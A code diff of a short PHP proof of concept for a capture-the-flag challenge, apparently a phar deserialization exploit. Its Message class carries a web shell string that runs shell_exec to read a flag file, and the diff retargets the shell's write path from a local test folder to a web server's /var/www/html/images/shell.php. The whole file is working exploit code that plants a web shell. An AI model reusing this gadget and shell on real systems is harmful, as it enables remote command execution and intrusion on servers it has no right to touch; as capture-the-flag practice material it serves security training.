@@ -1,11 +1,15 @@
 <?php
 
+// PoC for Challenge
+// William Moody
+// 10.04.2021
+
 class Message
 {
     public function __construct()
     {
         $this->to = "<?php echo shell_exec('cat ../flag.txt'); ?>";
-        $this->filePath = "/home/bill/Pen/ctf/247ctf/web/phar_rce/images/shell.php";
+        $this->filePath = "/var/www/html/images/shell.php";
     }
 }
 
